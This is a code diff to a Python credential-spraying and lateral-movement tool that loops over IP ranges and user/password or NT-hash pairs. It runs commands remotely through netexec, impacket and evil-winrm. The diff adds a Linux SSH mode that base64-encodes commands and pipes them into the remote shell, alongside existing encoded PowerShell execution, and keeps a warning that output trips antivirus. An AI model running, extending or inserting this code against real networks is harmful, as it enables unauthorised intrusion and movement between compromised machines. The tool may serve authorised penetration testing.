@@ -19,6 +19,7 @@ OUTPUT = False
 RUN_ALL = False
 SKIP_PORTSCAN = False
 TOOLS_SPECIFIED = False
+LINUX_MODE = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
 NXC_TOOLS = {"smbexec", "wmi", "ssh", "rdp"}
@@ -235,6 +236,9 @@ def build_cmd(tool, user, target, credential, command):
                 f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'")
 
     if tool == "ssh":
+        if LINUX_MODE:
+            b64 = base64.b64encode(command.encode("utf-8")).decode()
+            return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'echo {b64} | base64 -d | $0'{nxc_output_flag}"
         return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
 
     if tool == "rdp":
@@ -327,6 +331,10 @@ def run_chain(user, ip, credential, command, tool_list=None):
                 else:
                     safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
+            if tool == "ssh" and 'Linux - Shell' in out and not LINUX_MODE:
+                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but this seems like a Linux machine, so the command didn't run.")
+                safe_print("  \033[33m[!]\033[0m Use \033[33m--linux\033[0m to run command across Linux machines.")
+                continue
             if '[+]' in out and 'Executed command' not in out:
                 safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
                 continue
@@ -410,6 +418,8 @@ def parse_args():
     parser.add_argument("--skip-portscan", action="store_true", help="Skip port scanning and attempt all tools")
     parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password pairs)")
 
+    parser.add_argument("--linux", action="store_true", help="Linux-only mode - automates SSH, ignores other tools")
+
     parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
     parser.add_argument("username", nargs="?", help="Username")
     parser.add_argument("credential", nargs="?", help="Password or NT hash")
@@ -438,7 +448,7 @@ def check_dependencies():
         IMPACKET_PREFIX = "impacket-"
     elif r2:
         IMPACKET_PREFIX = ""
-    else:
+    elif not LINUX_MODE:
         print("[-] impacket not found. Install with: pipx install impacket")
         sys.exit(1)
     
@@ -465,7 +475,7 @@ def check_dependencies():
         for d in os.listdir(base):
             if d.endswith("@evil-winrm"):
                 WINRM_CMD = f"{base}/{d}/wrappers/evil-winrm"
-    if not WINRM_CMD:
+    if not WINRM_CMD and not LINUX_MODE:
         print("[-] evil-winrm not found. Please install with gem install evil-winrm")
         sys.exit(1)
     
@@ -476,7 +486,7 @@ def impacket_cmd(tool):
     return f"{tool}.py"
 
 def main():
-    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED
+    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED, LINUX_MODE
 
     check_dependencies()
 
@@ -484,28 +494,17 @@ def main():
 
     VERBOSE = args.v
     OUTPUT = args.o
-    MAX_THREADS = args.threads
+    MAX_THREADS = args.threads if args.threads > 0 else 1
     EXEC_TIMEOUT = args.timeout
     RUN_ALL = args.run_all
     SKIP_PORTSCAN = args.skip_portscan
-
-    if args.tools:
-        tool_list = parse_tools_list(args.tools)
-        TOOLS_SPECIFIED = True
-        print(f"[*] Using tools: {', '.join(tool_list)}")
-    else:
-        tool_list = None
-
-    if args.skip_portscan:
-        print("\033[33m[!] Port scanning disabled (--skip-portscan). All tools will be attempted.\033[0m")
-
-    command = " ".join(args.command) if args.command else "whoami"
+    LINUX_MODE = args.linux
 
     if args.file:
         credential_list = load_credential_file(args.file)
     else:
         credential_list = [(args.username, args.credential)]
-    
+
     if args.ip_range.endswith('.txt'):
         ips = []
         with open(args.ip_range) as f:
@@ -516,12 +515,32 @@ def main():
     else:
         ips = parse_ip_range(args.ip_range)
 
+    if len(ips) < MAX_THREADS:
+        MAX_THREADS = len(ips)
+
     print(f"[*] Loaded {len(credential_list)} credential set(s)")
     print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")
+
+    if args.linux:
+        if args.tools:
+            print("\033[31m[!] Tools (--tools) cannot be specified alongside Linux-mode (--linux), as only SSH is supported. Continuing with SSH...\033[0m")
+        args.tools = "ssh"
+
+    if args.tools:
+        tool_list = parse_tools_list(args.tools)
+        TOOLS_SPECIFIED = True
+        print(f"[*] Using tools: {', '.join(tool_list)}")
+    else:
+        tool_list = None
+    
+    if args.skip_portscan:
+        print("\033[33m[!] Port scanning disabled (--skip-portscan). All tools will be attempted.\033[0m")
+
+    command = " ".join(args.command) if args.command else "whoami"
     
     if not OUTPUT:
         print("\033[33m[!] Output Disabled. Run with -o to see successful command output\033[0m")
-    else:
+    elif not LINUX_MODE:
         print("-" * 20)
         print("\033[33m[!] WARNING: Output Enabled. This WILL trip AV for certain tools\033[0m")
         print("-" * 20)
